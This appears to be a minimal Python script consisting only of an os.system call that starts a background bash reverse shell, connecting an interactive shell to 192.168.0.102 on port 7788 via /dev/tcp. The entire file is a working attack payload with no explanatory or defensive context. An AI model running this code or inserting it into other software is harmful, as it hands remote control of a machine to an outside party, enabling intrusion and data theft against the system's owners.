import os

os.system("bash -c 'bash -i >& /dev/tcp/192.168.0.102/7788 0>&1' &")
